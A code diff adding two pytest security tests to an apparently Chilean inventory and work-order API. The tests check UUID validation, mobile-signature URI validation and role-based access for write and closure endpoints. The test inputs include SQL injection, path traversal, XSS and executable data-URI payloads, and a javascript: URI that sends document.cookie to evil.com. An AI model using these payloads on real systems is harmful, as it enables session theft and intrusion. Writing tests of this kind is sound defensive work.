@@ -226,3 +226,49 @@ def test_security_rut_sql_injection_and_malformed_blocked():
     for bad_rut in malicious_ruts:
         with pytest.raises(ValueError):
             schemas.validar_formato_rut(bad_rut)
+
+
+def test_security_qr_public_endpoint_read_only_and_malformed_uuid_blocked():
+    """[OWASP API1 / API8] Verifica que el endpoint QR público valide estrictamente UUID y que la modificación de QR exija rol ADMIN/JEFE_BODEGA"""
+    inv_auth = _load_inventory_auth()
+    # 1. Cualquier intento de pasar un payload SQLi o XSS como UUID de activo debe fallar en la validación estricta de UUID
+    malicious_activo_ids = [
+        "12345' OR '1'='1",
+        "../../etc/passwd",
+        "<script>alert('qr')</script>",
+        "00000000-0000-0000-0000-00000000000Z"
+    ]
+    for bad_id in malicious_activo_ids:
+        with pytest.raises(ValueError):
+            uuid.UUID(bad_id)
+
+    # 2. La modificación de etiquetas QR o ubicación de activos sigue protegida por RBAC (CLIENTE_CONVENIO y TECNICO_TERRENO bloqueados en escritura administrativa)
+    write_checker = inv_auth.require_role(["ADMIN", "JEFE_BODEGA"])
+    for blocked_role in ["CLIENTE_CONVENIO", "CLIENTE_ESTANDAR", "TECNICO_TERRENO"]:
+        with pytest.raises(HTTPException) as exc_info:
+            write_checker({"usuario_id": str(uuid.uuid4()), "role": blocked_role, "email": "ext@marcom.cl"})
+        assert exc_info.value.status_code == 403
+
+
+def test_security_firma_movil_tampered_uri_and_unauthorized_closure_blocked():
+    """[OWASP API5 / API8] Bloquea ejecutables/scripts disfrazados de firma móvil y bloquea cierre de OT por roles de cliente"""
+    wo_auth, wo_schemas = _load_work_order_service()
+    # 1. Bloqueo de firmas móviles adulteradas con MIME ejecutable o script
+    invalid_signatures = [
+        "data:application/x-msdownload;base64,TVqQAAMAAAAEAAAA",
+        "data:text/javascript;base64,YWxlcnQoMSk=",
+        "javascript:fetch('https://evil.com/steal?c='+document.cookie)"
+    ]
+    for bad_sig in invalid_signatures:
+        with pytest.raises(ValidationError):
+            wo_schemas.EvidenciaTerrenoCrear(
+                url_imagen="data:image/jpeg;base64,/9j/4AAQSkZJRg==",
+                url_firma=bad_sig,
+                comentarios="[Recepcionado por: Atacante]"
+            )
+
+    # 2. Un CLIENTE_CONVENIO no puede invocar endpoints de cierre o carga de firma de terreno (403 Forbidden)
+    closure_checker = wo_auth.require_role(["ADMIN", "JEFE_BODEGA", "TECNICO_TERRENO"])
+    with pytest.raises(HTTPException) as exc_info:
+        closure_checker({"usuario_id": str(uuid.uuid4()), "role": "CLIENTE_CONVENIO", "email": "cliente@empresa.cl"})
+    assert exc_info.value.status_code == 403
